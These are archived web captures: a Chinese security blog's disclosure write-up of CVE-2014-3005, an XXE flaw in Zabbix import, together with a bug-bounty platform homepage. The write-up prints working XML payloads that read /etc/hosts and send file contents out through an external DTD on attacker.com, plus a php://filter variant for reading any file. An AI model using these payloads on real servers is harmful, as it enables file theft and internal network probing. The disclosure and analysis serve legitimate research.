
**0×04，漏洞影响：**

1. 本地任意文件读取
2. 端口扫描
3. 内网探测

**0×05，修复建议：**

禁止对外部实体的解析。

**0×06，披露过程：**

04/24/2014 —— 发现漏洞

04/25/2014 —— 提交Zabbix官方（[https://support.zabbix.com/browse/ZBX-8151](https://web.archive.org/web/20140622034155/https%3A//support.zabbix.com/browse/ZBX-8151)）

04/27/2014 —— MITRE分配CVE-ID：CVE-2014-3005

06/17/2014 —— Fix Released

svn://svn.zabbix.com/branches/dev/ZBX-8151-18 r46594 for 1.8

svn://svn.zabbix.com/branches/dev/ZBX-8151-20 r46600 for 2.0+

本条目发布于[2014 年 6 月 17 日](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=273 "下午 10:57")。属于[代码审计[Code Audit]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=73 "查看代码审计[Code Audit]中的全部文章")、[漏洞挖掘[Vulnerability]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=110 "查看漏洞挖掘[Vulnerability]中的全部文章")分类，被贴了 [xxe attack](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?tag=xxe-attack)、[xxe漏洞](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?tag=xxe%e6%bc%8f%e6%b4%9e)、[zabbix漏洞](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?tag=zabbix%e6%bc%8f%e6%b4%9e)、[外部实体攻击](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?tag=%e5%a4%96%e9%83%a8%e5%ae%9e%e4%bd%93%e6%94%bb%e5%87%bb) 标签。作者是[pnig0s|小P](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?author=1 "查看所有由pnig0s|小P发布的文章")。

### 文章导航

[← Flash跨域数据劫持漏洞](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=310)
[[CVE-2014-3244]SugarCRM v6.5.1 rss dashlet LFI via XXE Attack →](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=294)

## 《[CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack》上有1条评论

1. Pingback引用通告： [Zabbix XML外部实体注入漏洞(CVE-2014-3005) | 国联天成](https://web.archive.org/web/20140622034155/http%3A//www.gltc.cn/43012.html)

### 发表评论 [取消回复](/web/20140622034155/http%3A//www.pnigos.com/?p=273#respond)

电子邮件地址不会被公开。 必填项已用\*标注

姓名 \*

电子邮件 \*

站点

评论

您可以使用这些HTML标签和属性： `<a href="" title=""> <abbr title=""> <acronym title=""> <b> <blockquote cite=""> <cite> <code> <del datetime=""> <em> <i> <q cite=""> <strike> <strong>`

### 近期文章

* [[CVE-2014-3244]SugarCRM v6.5.1 rss dashlet LFI via XXE Attack](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=294)
* [[CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=273)
* [Flash跨域数据劫持漏洞](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=310)
* [[CVE-2014-3242,3243]SOAPpy 0.12.5 Multiple Vulnerabilities](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=260)
* [Write-up:Digg.com stored xss](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=245)
### 分类目录

* [代码审计[Code Audit]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=73 "查看代码审计[Code Audit]下的所有文章") (4)
* [前端黑客[WebH4cking]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=4 "web hacking") (9)
* [唧唧歪歪[Gossip]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=5 "Gossip") (2)
* [机器学习[Make Love]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=88 "查看机器学习[Make Love]下的所有文章") (1)
* [渗透测试[Pentest]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=2 "H4cking") (2)
* [漏洞挖掘[Vulnerability]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=110 "查看漏洞挖掘[Vulnerability]下的所有文章") (9)
* [系统编程[SysCoding]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=3 "coding") (5)
### 文章归档

* [2014年六月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201406)
* [2014年五月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201405)
* [2014年四月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201404)
* [2014年三月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201403)
* [2014年二月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201402)
* [2013年十二月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201312)
* [2013年十一月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201311)
* [2013年五月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201305)
* [2013年四月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201304)
* [2013年二月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201302)
* [2013年一月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201301)
### Dig Security

[Browser Security](https://web.archive.org/web/20140622034155/https%3A//code.google.com/p/browsersec/wiki/Main)

[DOMXSS Wiki](https://web.archive.org/web/20140622034155/https%3A//code.google.com/p/domxsswiki/)

[SQLI Wiki](https://web.archive.org/web/20140622034155/http%3A//websec.ca/kb/sql_injection)

[Ruby Security](https://web.archive.org/web/20140622034155/https%3A//code.google.com/p/ruby-security/wiki/Guide)

[全球安全会议归档](https://web.archive.org/web/20140622034155/http%3A//archive.liquidmatrix.org/)

[渗透测试书签List](https://web.archive.org/web/20140622034155/https%3A//code.google.com/p/pentest-bookmarks/wiki/BookmarksList)

[HTML5Sec](https://web.archive.org/web/20140622034155/http%3A//html5sec.org/)

[Router Hacking](https://web.archive.org/web/20140622034155/http%3A//routerpwn.com/)

[Exploit Search](https://web.archive.org/web/20140622034155/http%3A//exploitsearch.net/)

[安全内容搜索](https://web.archive.org/web/20140622034155/http%3A//yehg.net/lab/pr0js/misc/wsa.php)

[Browser Security](https://web.archive.org/web/20140622034155/https%3A//code.google.com/p/browsersec)

[XssVec Collection](https://web.archive.org/web/20140622034155/http%3A//84692bb0df6f30fc0687-25dde2f20b8e8c1bda75aeb96f737eae.r66.cf1.rackcdn.com/xss.html)

### Tool Box

[JS Beautifier](https://web.archive.org/web/20140622034155/http%3A//jsbeautifier.org/)

[Run JS](https://web.archive.org/web/20140622034155/http%3A//runjs.cn/)

[sitedossier](https://web.archive.org/web/20140622034155/http%3A//www.sitedossier.com/)

[Code encoder&encrypter](https://web.archive.org/web/20140622034155/http%3A//yehg.net/encoding/)

[XSS'OR](https://web.archive.org/web/20140622034155/http%3A//evilcos.me/lab/xssor/)

[ViewState Decoder](https://web.archive.org/web/20140622034155/http%3A//ignatu.co.uk/ViewStateDecoder.aspx)

### 近期评论

* [Zabbix XML外部实体注入漏洞(CVE-2014-3005) | 国联天成](https://web.archive.org/web/20140622034155/http%3A//www.gltc.cn/43012.html)发表在《[[CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=273#comment-1857)》
* ttt发表在《[Flash跨域数据劫持漏洞](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=310#comment-829)》
* [白小黑](https://web.archive.org/web/20140622034155/http%3A//www.baixiaohei.com/)发表在《[About:Me](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?page_id=7#comment-538)》
* pnig0s|小P发表在《[Vulcan:基于gevent和多线程模型的WebKit动态爬虫](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=217#comment-484)》
* livers发表在《[Vulcan:基于gevent和多线程模型的WebKit动态爬虫](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=217#comment-482)》

[自豪地采用WordPress](https://web.archive.org/web/20140622034155/http%3A//cn.wordpress.org/ "优雅的个人发布平台")



=== Content from web.archive.org_22480ba8_20250126_110446.html ===


[![Wayback Machine](https://web-static.archive.org/_static/images/toolbar/wayback-toolbar-logo-200.png)](/web/ "Wayback Machine home page")

[480 captures](/web/20140625080449%2A/https%3A//www.vulbox.com/ "See a list of every capture for this URL")
25 Jun 2014 - 10 Jan 2025

| May | JUN | [**Sep**](https://web.archive.org/web/20140924123806/https%3A//www.vulbox.com/ "24 Sep 2014") |
| Previous capture | 25 | [Next capture](https://web.archive.org/web/20140705234337/http%3A//vulbox.com/ "23:43:37 Jul 05, 2014") |
| 2013 | 2014 | [**2015**](https://web.archive.org/web/20150703125029/http%3A//vulbox.com%3A80/ "03 Jul 2015") |

success
fail

 [About this capture](#expand)

COLLECTED BY

Organization: [Internet Archive](https://archive.org/details/webwidecrawl)

The Internet Archive discovers and captures web pages through many different web crawls.
At any given time several distinct crawls are running, some for months, and some every day or longer.
View the web archive through the [Wayback Machine](http://archive.org/web/web.php).

Collection: [Wide Crawl started June 2014](https://archive.org/details/wide00011)

Web wide crawl with initial seedlist and crawler configuration from June 2014.

TIMESTAMPS

![loading](https://web-static.archive.org/_static/images/loading.gif)

The Wayback Machine - https://web.archive.org/web/20140625080449/https://www.vulbox.com/

[登录](/web/20140625080449/https%3A//www.vulbox.com/login)
[注册](/web/20140625080449/https%3A//www.vulbox.com/register)

![](/web/20140625080449im_/https://www.vulbox.com/static/web/images/text_ldhz.png)
"连接世界各地的安全研究者与白帽子"
简单高效的漏洞处理平台，帮助你发现产品中潜在的安全风险

[参加项目](/web/20140625080449/https%3A//www.vulbox.com/login)

发起项目

## 热门项目

* [![paracletos](/web/20140625080449im_/https://www.vulbox.com/static/web/images/qqsjgj.png)](https://web.archive.org/web/20140625080449/http%3A//www.vulbox.com/home/bounties)
  ### [腾讯手机管家 (App)](https://web.archive.org/web/20140625080449/http%3A//www.vulbox.com/home/bounties)

  腾讯手机管家是腾讯旗下一款永久免费的手机安全与管理软件。

  *金额：***300 - 5000元/个***类型：*公开
* [![paracletos](/web/20140625080449im_/https://www.vulbox.com/static/web/images/task_pic01.jpg)](https://web.archive.org/web/20140625080449/http%3A//www.vulbox.com/home/bounties)
  ### [深信服产品 (Web&系统)](https://web.archive.org/web/20140625080449/http%3A//www.vulbox.com/home/bounties)

  深信服科技有限公司是中国领先的新网络产品供应商。本项目为深信服公司即将推出的最新产品。

  *漏洞赏金：***300 - 3000元/个***类型：*私密
* [![paracletos](/web/20140625080449im_/https://www.vulbox.com/static/web/images/color-box.png)](https://web.archive.org/web/20140625080449/http%3A//www.vulbox.com/home/bounties)
  ### [漏洞盒子平台 (Web)](https://web.archive.org/web/20140625080449/http%3A//www.vulbox.com/home/bounties)

  漏洞盒子是一个简单高效的漏洞处理平台，激励漏洞发掘和研究。为此CEO决定自掏腰包，以身作则提高产品安全性。

  *金额：***200 - 2000元/个***类型：*公开
* [![paracletos](/web/20140625080449im_/https://www.vulbox.com/static/web/images/task_pic03.jpg)](https://web.archive.org/web/20140625080449/http%3A//www.vulbox.com/home/bounties)
  ### [某知名高校在线教学平台 (Web)](https://web.archive.org/web/20140625080449/http%3A//www.vulbox.com/home/bounties)

  一个专注于IT学科的综合在线教育服务平台，其课程内容包括Android开发、Cisco网络技术、网络安全等。

  *金额：***100 - 1000元/个***类型：*私密

[更多](/web/20140625080449/https%3A//www.vulbox.com/login)

loading...

## 项目流程

无漏洞，不收费！多个大型厂商已抢先加入，现在轮到你了
![](/web/20140625080449im_/https://www.vulbox.com/static/web/images/test_pic01.jpg)
发起项目
厂商发起待测试的项目，并可根据项目私密性自由选择测试模式

![](/web/20140625080449im_/https://www.vulbox.com/static/web/images/test_pic02.jpg)
安全测试
漏洞盒子汇聚了遍布全球的白帽子，他们会参与到项目中，帮助你发现安全漏洞

![](/web/20140625080449im_/https://www.vulbox.com/static/web/images/test_pic03.jpg)
结果反馈
厂商与白帽子通过漏洞盒子有效沟通，厂商及时获知安全漏洞，白帽子获得赏金

### 漏洞处理流程

![](/web/20140625080449im_/https://www.vulbox.com/static/web/images/rool_photo01.jpg)
漏洞之王为Google公司报告了一个安全漏洞：
“在偶然的一次测试过程中，我漫游了Google公司的内网，并成功拿到了你们CEO的个人资料”

my\_secret\_video.avi

![](/web/20140625080449im_/https://www.vulbox.com/static/web/images/rool_photo02.jpg)
Google公司把漏洞状态改为处理中

![](/web/20140625080449im_/https://www.vulbox.com/static/web/images/rool_photo02.jpg)
Google公司处理完毕，关闭了该漏洞并支付漏洞之王5000元的赏金

![](/web/20140625080449im_/https://www.vulbox.com/static/web/images/rool_photo01.jpg)
漏洞之王要求公开这个漏洞

![](/web/20140625080449im_/https://www.vulbox.com/static/web/images/rool_photo02.jpg)
Google公司同意公开这个漏洞

![](/web/20140625080449im_/https://www.vulbox.com/static/web/images/rool_photo02.jpg)
Google公司发表评论：
“做得很好，谢谢你为我们提供的报告”

负责任的漏洞处理
漏洞盒子努力寻找到一个最平衡的[漏洞处理流程](https://web.archive.org/web/20140625080449/https%3A//www.vulbox.com/rules)。厂商可根据项目的私密性选择最合适的测试模式，以保护项目隐私；白帽子在获得漏洞赏金之外，更可通过平台与厂商实现面对面的沟通，在尊重厂商利益的前提下，获得漏洞披露机会。

厂商与白帽子之间的信任
我们相信，通过在漏洞盒子平台中融入契约精神、有效沟通以及资源的合理配置，可以真正为厂商与白帽子建立信任、尊重、合作与共赢。

公正、透明、第三方
漏洞盒子是一个独立的第三方机构，我们深知公正对于厂商和白帽子的重要性。因此，我们将漏洞处理流程、漏洞奖励规则完全公开，项目自发布后任何人不得更改。同时每一个漏洞状态、厂商的处理方式及流向，都能在平台中清晰呈现。

不作恶
注重隐私保护是安全从业者的基本素质，我们中的每个人都必须严格遵守[漏洞盒子隐私政策条款](https://web.archive.org/web/20140625080449/https%3A//www.vulbox.com/privacy)

## 合作伙伴

* ![](/web/20140625080449im_/https://www.vulbox.com/static/web/images/partner_pic01.jpg)
* ![](/web/20140625080449im_/https://www.vulbox.com/static/web/images/partner_pic02.jpg)
* ![](/web/20140625080449im_/https://www.vulbox.com/static/web/images/partner_pic03.jpg)
* ![](/web/20140625080449im_/https://www.vulbox.com/static/web/images/partner_pic04.jpg)

还在为产品存在安全漏洞而担心?
汇聚全球安全研究者与白帽子，尽在漏洞盒子

[关于我们](https://web.archive.org/web/20140625080449/https%3A//www.vulbox.com/about)[联系我们](https://web.archive.org/web/20140625080449/https%3A//www.vulbox.com/contact)[隐私条款](https://web.archive.org/web/20140625080449/https%3A//www.vulbox.com/privacy)[流程规则](https://web.archive.org/web/20140625080449/https%3A//www.vulbox.com/rules)
©2014 www.vulbox.com. All rights reserved  [沪ICP备13033796号](https://web.archive.org/web/20140625080449/http%3A//www.miibeian.gov.cn/)

### 厂商资格注册

* 厂商名称 :
* 联系方式(重要) :
* 希望被测试或入驻的项目(附简述)

取消



=== Content from web.archive.org_608af747_20250126_110512.html ===


[![Wayback Machine](https://web-static.archive.org/_static/images/toolbar/wayback-toolbar-logo-200.png)](/web/ "Wayback Machine home page")

[11 captures](/web/20140622034155%2A/http%3A//www.pnigos.com/?p=273 "See a list of every capture for this URL")
22 Jun 2014 - 18 Jul 2024

| May | JUN | [**Sep**](https://web.archive.org/web/20140917004652/http%3A//www.pnigos.com%3A80/?p=273 "17 Sep 2014") |
| Previous capture | 22 | [Next capture](https://web.archive.org/web/20140917004652/http%3A//www.pnigos.com%3A80/?p=273 "00:46:52 Sep 17, 2014") |
| 2013 | 2014 | [**2015**](https://web.archive.org/web/20150820194335/http%3A//www.pnigos.com/?p=273 "20 Aug 2015") |

success
fail

 [About this capture](#expand)

COLLECTED BY

Organization: [Alexa Crawls](https://archive.org/details/alexacrawls)

Starting in 1996, [Alexa Internet](http://www.alexa.com/) has been donating their crawl data to the Internet Archive. Flowing in every day, these data are added to the [Wayback Machine](http://web.archive.org/) after an embargo period.

Collection: [Alexa Crawls](https://archive.org/details/alexacrawls)

Starting in 1996, [Alexa Internet](http://www.alexa.com/) has been donating their crawl data to the Internet Archive. Flowing in every day, these data are added to the [Wayback Machine](http://web.archive.org/) after an embargo period.

TIMESTAMPS

![loading](https://web-static.archive.org/_static/images/loading.gif)

The Wayback Machine - https://web.archive.org/web/20140622034155/http://www.pnigos.com:80/?p=273

# [风井](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/ "风井")

## Know me then ignore me

### 菜单

[跳至内容](#content "跳至内容")

* [首页](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/)
* [About:Me](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?page_id=7)
* [Papers](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?page_id=2)
* [FreeBuf](https://web.archive.org/web/20140622034155/http%3A//www.freebuf.com/)
* [VulBox](https://web.archive.org/web/20140622034155/https%3A//vulbox.com/)

# [CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack

[1条回复](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=273#comments "《[CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack》上的评论")

**0×01，背景：**

zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。

**0×02，漏洞说明：**

zabbix提供灵活的针对各项配置的导入/导出机制，支持XML的数据格式。后端在对导入的xml数据进行处理时，解析了外部实体，导致攻击者可以构造恶意的xml文件，读取zabbix服务器本地文件内容或以服务器为代理发起网络请求，扫描端口，探测内网。

**影响版本：**1.8.x-2.2（当前最新版）

**Found by：**pnig0s

**0×03，漏洞分析：**

问题代码存在于include/classes/import/CXmlImport18.php，395行：

```
public static function import($file) {
libxml_use_internal_errors(true);

$xml = new DOMDocument();
if (!$xml->loadXML($file)) {
    $text = '';
    foreach (libxml_get_errors() as $error) {
        switch ($error->level) {
            case LIBXML_ERR_WARNING:
                $text .= _('XML file contains errors').'. Warning '.$error->code.': ';
                break;
            case LIBXML_ERR_ERROR:
                $text .= _('XML file contains errors').'. Error '.$error->code.': ';
                break;
            case LIBXML_ERR_FATAL:
                $text .= _('XML file contains errors').'. Fatal Error '.$error->code.': ';
                break;
        }

        $text .= trim($error->message).' [ Line: '.$error->line.' | Column: '.$error->column.' ]';
        break;
    }
    libxml_clear_errors();

    throw new Exception($text);
}
```

代码首先初始化了DOMDocument对象，然后调用loadXML函数对导入的XML文件进行解析。DOMDocument，SimpleXML和XMLReader是PHP中三种最常用的处理XML的方式，这三种方式默认都支持对外部实体的解析，而这段代码中也没有明确禁止对外部实体的解析。

我们创建一个符合zabbix要求的xml文件，并在起始处声明外部实体。

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY file SYSTEM "file:///etc/hosts">
]>
<zabbix_export>&file;</zabbix_export>
```

进入Configuration->Hosts->Import，并导入，发现回显报错，但不是预期的文件内容。

![](https://web.archive.org/web/20140622034155im_/http://www.pnigos.com/wp-content/plugins/wp-ueditor/ueditor/php/upload/6631398426709.PNG "directly_error.PNG")

跟到报错信息所指的文件中，include/classes/import/CXmlImport18.php，第425行

```
if ($xml->childNodes->item(0)->nodeName != 'zabbix_export') {
    $xml2 = self::createDOMDocument();
    $xml2->appendChild($xml2->ownerDocument->importNode($xml->childNodes->item(0), true));
    self::$xml = $xml2->ownerDocument;
}
else {
    self::$xml = $xml;
}
```

代码判断了子节点的第一个结点是否为zabbix\_export，若不是则创建一个新的xml DOM文档并将之前的第一个结点复制到新的DOM文档中使用。而我们构造的xml文件的第一个结点是<!DOCTYPE xxx []>，文档类型的声明不符合一般结点的规范，因此在导入时报错。逻辑中断在这里不会继续执行，无法达到我们的目的。而文档类型的声明又必须紧邻xml头的声明，我们也不能调整DOCTYPE声明的位置。

看似这个问题变得鸡肋了，不过可以使用一些tricks，曲线救国，达到我们的目的。

这里使用<!ENTITY % xxx “”>的参数实体形式在loadXML阶段主动构造出一个报错，把我们想要获取的信息爆出来同时可以发送到攻击者的服务器。参数实体不同与通用实体，仅能在实体声明内部使用。

首先在攻击者的服务器attacker.com中建立ext.dtd，内容为：

```
<!ENTITY % all
 "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?%file;'>"
>
%all;
```

将要导入的xml文件修改为：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY % file SYSTEM "file:///etc/hosts">
 <!ENTITY % dtd SYSTEM "http://attacker.com/ext.dtd">
%dtd;
%send;
]]>
<zabbix_export>
</zabbix_export>
```

将该文件导入，返回结果如下

![](https://web.archive.org/web/20140622034155im_/http://www.pnigos.com/wp-content/plugins/wp-ueditor/ueditor/php/upload/77481398426709.PNG "redirect_plaintext_error.PNG")

很好很强大，爆出了服务器的hosts文件内容。但是这里还有一个小问题，有些文件过长或包含特殊的符号，会截断我们特意构造的参数实体声明，导致文件内容读取不完整。不过好在万能的php提供了php://filter/read=convert.base64-encode/resource这一wrapper，可以以base64的编码形式读取任意文件。

于是将要导入的xml文件修改为：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts">
 <!ENTITY % dtd SYSTEM "http://attacker.com/ext.dtd">
%dtd;
%send;
]]>
<zabbix_export>
</zabbix_export>
```

查看远端Web访问日志：

![](https://web.archive.org/web/20140622034155im_/http://www.pnigos.com/wp-content/plugins/wp-ueditor/ueditor/php/upload/65091398426709.PNG "1.PNG")

解码base64：

![](https://web.archive.org/web/20140622034155im_/http://www.pnigos.com/wp-content/plugins/wp-ueditor/ueditor/php/upload/32991398426709.PNG "burp_decode_hosts.PNG")

**0×04，漏洞影响：**

1. 本地任意文件读取
2. 端口扫描
3. 内网探测

**0×05，修复建议：**

禁止对外部实体的解析。

**0×06，披露过程：**

04/24/2014 —— 发现漏洞

04/25/2014 —— 提交Zabbix官方（[https://support.zabbix.com/browse/ZBX-8151](https://web.archive.org/web/20140622034155/https%3A//support.zabbix.com/browse/ZBX-8151)）

04/27/2014 —— MITRE分配CVE-ID：CVE-2014-3005

06/17/2014 —— Fix Released

svn://svn.zabbix.com/branches/dev/ZBX-8151-18 r46594 for 1.8

svn://svn.zabbix.com/branches/dev/ZBX-8151-20 r46600 for 2.0+

本条目发布于[2014 年 6 月 17 日](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=273 "下午 10:57")。属于[代码审计[Code Audit]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=73 "查看代码审计[Code Audit]中的全部文章")、[漏洞挖掘[Vulnerability]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=110 "查看漏洞挖掘[Vulnerability]中的全部文章")分类，被贴了 [xxe attack](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?tag=xxe-attack)、[xxe漏洞](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?tag=xxe%e6%bc%8f%e6%b4%9e)、[zabbix漏洞](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?tag=zabbix%e6%bc%8f%e6%b4%9e)、[外部实体攻击](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?tag=%e5%a4%96%e9%83%a8%e5%ae%9e%e4%bd%93%e6%94%bb%e5%87%bb) 标签。作者是[pnig0s|小P](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?author=1 "查看所有由pnig0s|小P发布的文章")。

### 文章导航

[← Flash跨域数据劫持漏洞](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=310)
[[CVE-2014-3244]SugarCRM v6.5.1 rss dashlet LFI via XXE Attack →](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=294)

## 《[CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack》上有1条评论

1. Pingback引用通告： [Zabbix XML外部实体注入漏洞(CVE-2014-3005) | 国联天成](https://web.archive.org/web/20140622034155/http%3A//www.gltc.cn/43012.html)

### 发表评论 [取消回复](/web/20140622034155/http%3A//www.pnigos.com/?p=273#respond)

电子邮件地址不会被公开。 必填项已用\*标注

姓名 \*

电子邮件 \*

站点

评论

您可以使用这些HTML标签和属性： `<a href="" title=""> <abbr title=""> <acronym title=""> <b> <blockquote cite=""> <cite> <code> <del datetime=""> <em> <i> <q cite=""> <strike> <strong>`

### 近期文章

* [[CVE-2014-3244]SugarCRM v6.5.1 rss dashlet LFI via XXE Attack](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=294)
* [[CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=273)
* [Flash跨域数据劫持漏洞](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=310)
* [[CVE-2014-3242,3243]SOAPpy 0.12.5 Multiple Vulnerabilities](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=260)
* [Write-up:Digg.com stored xss](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=245)
### 分类目录

* [代码审计[Code Audit]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=73 "查看代码审计[Code Audit]下的所有文章") (4)
* [前端黑客[WebH4cking]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=4 "web hacking") (9)
* [唧唧歪歪[Gossip]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=5 "Gossip") (2)
* [机器学习[Make Love]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=88 "查看机器学习[Make Love]下的所有文章") (1)
* [渗透测试[Pentest]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=2 "H4cking") (2)
* [漏洞挖掘[Vulnerability]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=110 "查看漏洞挖掘[Vulnerability]下的所有文章") (9)
* [系统编程[SysCoding]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=3 "coding") (5)
### 文章归档

* [2014年六月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201406)
* [2014年五月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201405)
* [2014年四月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201404)
* [2014年三月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201403)
* [2014年二月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201402)
* [2013年十二月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201312)
* [2013年十一月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201311)
* [2013年五月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201305)
* [2013年四月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201304)
* [2013年二月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201302)
* [2013年一月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201301)
### Dig Security

[Browser Security](https://web.archive.org/web/20140622034155/https%3A//code.google.com/p/browsersec/wiki/Main)

[DOMXSS Wiki](https://web.archive.org/web/20140622034155/https%3A//code.google.com/p/domxsswiki/)

[SQLI Wiki](https://web.archive.org/web/20140622034155/http%3A//websec.ca/kb/sql_injection)

[Ruby Security](https://web.archive.org/web/20140622034155/https%3A//code.google.com/p/ruby-security/wiki/Guide)

[全球安全会议归档](https://web.archive.org/web/20140622034155/http%3A//archive.liquidmatrix.org/)

[渗透测试书签List](https://web.archive.org/web/20140622034155/https%3A//code.google.com/p/pentest-bookmarks/wiki/BookmarksList)

[HTML5Sec](https://web.archive.org/web/20140622034155/http%3A//html5sec.org/)

[Router Hacking](https://web.archive.org/web/20140622034155/http%3A//routerpwn.com/)

[Exploit Search](https://web.archive.org/web/20140622034155/http%3A//exploitsearch.net/)

[安全内容搜索](https://web.archive.org/web/20140622034155/http%3A//yehg.net/lab/pr0js/misc/wsa.php)

[Browser Security](https://web.archive.org/web/20140622034155/https%3A//code.google.com/p/browsersec)

[XssVec Collection](https://web.archive.org/web/20140622034155/http%3A//84692bb0df6f30fc0687-25dde2f20b8e8c1bda75aeb96f737eae.r66.cf1.rackcdn.com/xss.html)

### Tool Box

[JS Beautifier](https://web.archive.org/web/20140622034155/http%3A//jsbeautifier.org/)

[Run JS](https://web.archive.org/web/20140622034155/http%3A//runjs.cn/)

[sitedossier](https://web.archive.org/web/20140622034155/http%3A//www.sitedossier.com/)

[Code encoder&encrypter](https://web.archive.org/web/20140622034155/http%3A//yehg.net/encoding/)

[XSS'OR](https://web.archive.org/web/20140622034155/http%3A//evilcos.me/lab/xssor/)

[ViewState Decoder](https://web.archive.org/web/20140622034155/http%3A//ignatu.co.uk/ViewStateDecoder.aspx)

### 近期评论

* [Zabbix XML外部实体注入漏洞(CVE-2014-3005) | 国联天成](https://web.archive.org/web/20140622034155/http%3A//www.gltc.cn/43012.html)发表在《[[CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=273#comment-1857)》
* ttt发表在《[Flash跨域数据劫持漏洞](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=310#comment-829)》
